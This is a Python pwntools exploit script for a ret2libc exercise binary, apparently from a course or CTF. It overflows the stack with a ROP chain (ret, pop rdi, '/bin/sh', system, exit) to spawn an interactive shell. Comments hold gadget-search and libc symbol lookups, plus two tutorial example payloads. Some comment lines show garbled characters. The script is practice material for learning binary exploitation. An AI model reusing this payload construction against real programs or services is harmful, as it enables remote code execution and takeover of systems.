#!/usr/bin/env python3
from pwn import *

r = process('./ret2libc')
# r = remote('140.113.24.241', 30173)

print(r.recv().decode())

# elf = ELF('./ret2libc')
# print(hex(elf.got['puts']))
# print(hex(elf.plt['puts']))
# print(hex(elf.sym['main']))

puts_got  = 0x0000000000404018
puts_plt  = 0x0000000000401064
main_addr = 0x00000000004011a0

# 0x00000000004011cc <+44>:  call   0x401080 <setvbufÉplt>
# 0x00000000004011ea <+74>:  call   0x401080 <setvbufÉplt>
# 0x00000000004011f9 <+89>:  call   0x401060 <putsÉplt>
# 0x0000000000401203 <+99>:  call   0x401176 <hackMe>
# 0x0000000000401212 <+114>: call   0x401060 <putsÉplt>

pop_rdi_ret_offset = 0x00000000000277e5
ret_offset         = 0x0000000000027182
system_offset      = 0x000000000004c490
exit_offset        = 0x000000000003e680
bin_sh_offset      = 0x0000000000196031

# payload =  b'A' * 128 + b'B' * 8 + p64(main_addr) 
# r.send(payload)
# print(r.recv())

# libc_base
libc_base = 0
temp = input()
libc_base = int(temp, 16)
if libc_base != 0:
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_addr    = libc_base + ret_offset
    system_addr = libc_base + system_offset
    exit_addr   = libc_base + exit_offset
    bin_sh_addr = libc_base + bin_sh_offset

    payload =  b'A' * 128
    payload += b'B' * 8
    payload += p64(ret_addr)
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    payload += p64(exit_addr)

    r.sendline(payload)

r.interactive()

# claiÉ73225fe5e1e8:ü/source/ret2libc$ ldd ret2libc
#  linux-vdso.so.1 (0x00007ffeb2b5c000)
#  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5aac02d000)
#  /lib64/ld-linux-x86-64.so.2 (0x00007f5aac217000)

# claiÉ73225fe5e1e8:ü/source/ret2libc$ ROPgadget --binary
#  ./ret2libc --only "popöret"
# Gadgets information
# ============================================================
# 0x000000000040115d : pop rbp ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 2

# clai@73225fe5e1e8:~/source/ret2libc$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
# Gadgets information
# ============================================================
# 0x00000000000277e5 : pop rdi ; ret
# 0x0000000000027182 : ret

# claiÉ73225fe5e1e8:ü/source/ret2libc$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
#   1023: 000000000004c490    45 FUNC    WEAK   DEFAULT   16 systemÉÉGLIBC_2.2.5

# claiÉ73225fe5e1e8:ü/source/ret2libc$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "exit"
#    517: 000000000003e680    26 FUNC    GLOBAL DEFAULT   16 exit@@GLIBC_2.2.5

# claiÉ73225fe5e1e8:ü/source/ret2libc$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
#  196031 /bin/sh

# pwndbg> vmmap
# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
#              Start                End Perm     Size Offset File
#           0x400000           0x401000 r--p     1000      0 /home/clai/source/ret2libc/ret2libc
#           0x401000           0x402000 r-xp     1000   1000 /home/clai/source/ret2libc/ret2libc
#           0x402000           0x403000 r--p     1000   2000 /home/clai/source/ret2libc/ret2libc
#           0x403000           0x404000 r--p     1000   2000 /home/clai/source/ret2libc/ret2libc
#           0x404000           0x405000 rw-p     1000   3000 /home/clai/source/ret2libc/ret2libc
#     0x7f7f3d804000     0x7f7f3d807000 rw-p     3000      0 [anon_7f7f3d804]
#     0x7f7f3d807000     0x7f7f3d82d000 r--p    26000      0 /usr/lib/x86_64-linux-gnu/libc.so.6   <-------- libc_base addr I choose (0x7f7f3d807000)


# ----- example ----- 
# https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/

# # leak libc_base
# # poprdi gadget: 0x00401493 : pop rdi; ret
# # ret    gadget: 0x0040101a : ret

# poprdi   = 0x00401493
# ret      = 0x0040101a
# elf = ELF('the_library')
# puts_got = elf.got['puts']
# puts_plt = elf.plt['puts']
# main     = elf.sym['main']

# buf = b'A' * 552 + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)

# # get shell
# libc.address = u64(p.recv(8)[:6] + '\x00\x00') - libc.symbols['puts'] 
# system = libc.sym["system"]
# exit   = libc.sym["exit"]
# binsh  = next(libc.search("/bin/sh")) 

# buf = b'A'*552 + p64(poprdi) + p64(binsh)  + p64(system) + p64(exit)
# buf = b'A'*552 + p64(ret)    + p64(poprdi) + p64(binsh)  + p64(system) + p64(exit) (If previous segment fault)




# ----- example -----
# https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465

# import sys
# import struct
# libc_base_address = 0x7ffff7dc5000

# ret             = libc_base_address + 0x0c0533      # ROPgadget
# pop_rdi         = libc_base_address + 0x026b72      # ROPgadget
# bin_sh          = libc_base_address + 0x1b75aa      # strings
# system_function = libc_base_address + 0x055410      # readelf
# exit_function   = libc_base_address + 0x049bc0      # readelf

# buf  = b”A” * 208
# buf += b”BBBBBBBB”                              # rbp overwrite
# buf += struct.pack(‘<Q’,ret)                    # 
# buf += struct.pack(‘<Q’,pop_rdi)                # rip overwrite
# buf += struct.pack(‘<Q’,bin_sh)                 # rsp overwrite
# buf += struct.pack(‘<Q’,system_function)
# buf += struct.pack(‘<Q’,exit_function)

# sys.stdout.buffer.write(buf)